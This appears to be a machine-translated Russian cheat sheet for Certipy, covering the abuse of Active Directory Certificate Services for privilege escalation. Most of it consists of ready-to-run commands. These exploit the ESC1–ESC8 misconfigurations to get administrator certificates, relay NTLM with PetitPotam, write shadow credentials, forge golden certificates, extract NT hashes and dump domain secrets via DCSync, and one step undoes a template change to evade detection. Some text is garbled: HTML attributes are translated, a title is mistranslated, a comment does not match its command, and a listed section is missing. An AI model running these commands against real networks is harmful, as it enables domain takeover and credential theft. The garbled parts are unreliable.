<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p выравнивание="центр">
  <b>🔑Комплексный инструмент для выявления и использования неправильных конфигураций служб сертификации Active Directory (AD CS)</b>
</p>

---

## 📋 Содержание

- [Введение](#-введение)
- [Почему злоупотребление AD CS?](#-why-ad-cs-abuse)
- [Установка](#-установка)
- [Обзор подкоманд Certipy] (#-certipy-subcommands-overview)
- [Перечисление и обнаружение (`find`)](#-enumeration--discovery-find)
- [Матрица уязвимостей ESC](#-the-esc-vulnerability-matrix)
  - [ESC1: Альтернативное имя субъекта расходных материалов участника (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: Any Purpose EKU или SubCA](#esc2-any-function-eku-or-subca)
  - [ESC3: Агент запроса сертификата](#esc3-certificate-request-agent)
  - [ESC4: Управление доступом к уязвимому шаблону (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 включено](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Управление доступом к уязвимому центру сертификации] (#esc7-vulnerable-ca-access-control)
  - [ESC8: Ретрансляция NTLM для веб-регистрации HTTP](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 и ESC10: серьезные ошибки сопоставления сертификатов] (#esc9--esc10-strong-certificate-mapping-flaws)
- [Теневые учетные данные (`shadow`)](#-shadow-credentials-shadow)
- [Золотые сертификаты (`forge`)](#-golden-certificates-forge)
- [Аутентификация с помощью PFX (`auth`)](#-аутентификация-с-pfx-auth)
- [Рабочие процессы атак в реальном мире](#-real-world-attack-workflows)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Советы и рекомендации](#-tips--best-practices)
- [Юридическая оговорка](#-юридическая оговорка)
- [Ресурсы](#-ресурсы)

---

## 🎯 Введение

**Certipy** (созданный Оливером Ляком) — это ведущий инструмент на основе Python для подсчета и использования служб сертификации Active Directory (**AD CS**). AD CS — это реализация инфраструктуры открытых ключей (PKI) Microsoft для корпоративных сетей Active Directory, широко используемая для входа в систему с использованием смарт-карт, VPN, S/MIME и внутреннего шифрования TLS.

Поскольку неправильные настройки сертификатов часто позволяют непривилегированным пользователям домена запрашивать сертификаты в качестве администраторов домена или контроллеров домена, злоупотребление AD CS представляет собой один из наиболее надежных и эффективных векторов эскалации домена в современных корпоративных тестах на проникновение.

---

## ⚖️ Почему злоупотребляет AD CS?

- ⚡ **Мгновенное расширение домена.** Неправильно настроенные шаблоны сертификатов часто приводят к компрометации всего домена за считанные секунды.
- 🔑 **Скрытность и постоянство:** Украденные сертификаты или поддельные золотые сертификаты могут оставаться действительными в течение многих лет, не вызывая стандартных предупреждений о смене пароля.
- 🔄 **PKINIT в NT-хеш:** Certipy проверяет подлинность запрошенных сертификатов `.pfx` через Kerberos PKINIT, получая открытый текстовый NT-хеш цели непосредственно из KDC.

---

## 📥 Установка

### Использование pipx (рекомендуется)
```bash
pipx install certipy-ad
```
### Из репозитория GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Проверка
```bash
certipy -h
```
---

## 🧭 Обзор подкоманд Certipy

| Подкоманда | Функция |
|------------|----------|
| `find` | Перечислять центры сертификации, шаблоны и обнаруживать уязвимости ESC |
| `req` | Запрос сертификатов из уязвимых шаблонов |
| `auth` | Аутентификация с использованием сертификатов `.pfx` для получения хэшей TGT и NT |
| `ca` | Перечислить и изменить параметры конфигурации CA |
| `template` | Изменить настройки шаблона сертификата (полезно в ESC4) |
| `account` | Управление учетными записями компьютеров Active Directory (MachineAccountQuota) |
| `shadow` | Использование теневых учетных данных (`msDS-KeyCredentialLink`) |
| `forge` | Подделать золотые сертификаты, используя украденный закрытый ключ центра сертификации |

---

## 🔍 Перечисление и обнаружение (`find`)

Начните с определения центра сертификации предприятия (CA) и сканирования уязвимых шаблонов:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 Матрица уязвимостей ESC

### ESC1: Альтернативное имя субъекта предоставления материалов участника (SAN)

**Состояние:**
- Пользователи с низким уровнем привилегий имеют права регистрации (включен `Client Authentication` EKU).
- В шаблоне указан `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (позволяет запрашивающей стороне указать любое альтернативное имя субъекта, например, «Администратор домена»).

**Эксплуатация:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Выходные данные дают администраторский TGT и открытый текстовый NT-хеш!*

---

### ESC2: любое назначение EKU или SubCA

**Состояние:**
- В шаблоне указано `Any Purpose` EKU или не определено EKU.
- Может использоваться для любых целей, включая аутентификацию клиента.

**Эксплуатация:**
Используется идентично ESC1 или используется в сочетании с ESC3 для получения сертификата агента регистрации.

---

### ESC3: Агент запроса сертификата

**Состояние:**
- В шаблоне имеется `Certificate Request Agent` EKU (Агент регистрации).
— Позволяет запрашивать сертификаты от имени другого пользователя через вторичные шаблоны.

**Эксплуатация:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Управление доступом к уязвимым шаблонам (ACL)

**Состояние:**
- Пользователь с низким уровнем привилегий имеет права `WriteOwner`, `WriteDacl` или `WriteProperty` на шаблон сертификата.

**Эксплуатация:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 включено

**Состояние:**
- В ЦС установлен флаг `EDITF_ATTRIBUTESUBJECTALTNAME2`, позволяющий любому запросу сертификата указывать произвольные SAN независимо от настроек шаблона!

**Эксплуатация:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Уязвимый контроль доступа CA

**Состояние:**
- Пользователь имеет права `ManageCA` или `ManageCertificates` на самом центре сертификации.

**Эксплуатация:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: ретрансляция NTLM на веб-регистрацию HTTP

**Состояние:**
— В ЦС включена конечная точка HTTP веб-регистрации (`/certsrv/`) с аутентификацией NTLM без EPA (расширенная защита аутентификации) и HTTPS.

**Рабочий процесс эксплуатации:**
1. Запустите `ntlmrelayx`, указывая на веб-регистрацию CA:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Запустите принудительную аутентификацию машины через PetitPotam или PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` передает аутентификацию NTLM учетной записи компьютера контроллера домена, запрашивает сертификат компьютера и выводит base64 `.pfx`.
4. Выполните аутентификацию в качестве контроллера домена с помощью Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Используйте NT-хеш контроллера домена для выполнения полного дампа DCSync с помощью `impacket-secretsdump`.

---

## 👥 Теневые учетные данные (`shadow`)

Если скомпрометированная учетная запись имеет доступ на запись к атрибуту `msDS-KeyCredentialLink` другой учетной записи:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Золотые сертификаты (`forge`)

Если вы скомпрометировали ЦС и извлекли его закрытый ключ:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Аутентификация с помощью PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Реальные рабочие процессы атак

### Полный захват домена ESC1 за 3 команды
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Краткая справочная таблица

| Задача | Команда |
|------|---------|
| **Перечислить AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Запросить сертификат (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Аутентификация PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Изменить шаблон (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Теневые учетные данные** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Управление правами ЦС** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Создать Золотой сертификат** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Советы и рекомендации

1. **Проверьте синхронизацию часов постоянного тока:**
   Kerberos PKINIT требует синхронизации системного времени с контроллером домена в течение 5 минут. Бегать:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Обработка KDC_ERR_PADATA_TYPE_NOSUPP:**
   Если `certipy auth` завершается с этой ошибкой, на контроллере домена не установлен действительный сертификат контроллера домена для PKINIT. В этом случае используйте аутентификацию LDAP или SChannel.
3. **Всегда очищайте шаблоны ESC4:**
   При изменении шаблонов сертификатов всегда сохраняйте и повторно применяйте резервную конфигурацию (`-configuration <FILE>.json`), чтобы избежать уязвимости среды и сбоев в работе.

---

## ⚠️ Юридическая оговорка

> **ВАЖНО:** Атаки служб сертификации Active Directory предоставляют критически важный и эффективный административный доступ во всех доменных сетях. Сертипи должен выполняться только во время авторизованных тестов на проникновение, учений красной команды и проверок этической безопасности только с письменного разрешения.

---

## 📚 Ресурсы

- [Официальный репозиторий Certipy на GitHub](https://github.com/ly4k/Certipy)
- [Сертифицированный бывший в эксплуатации технический документ (Specterops)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Пути атак и средства защиты AD CS (Оливер Ляк)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)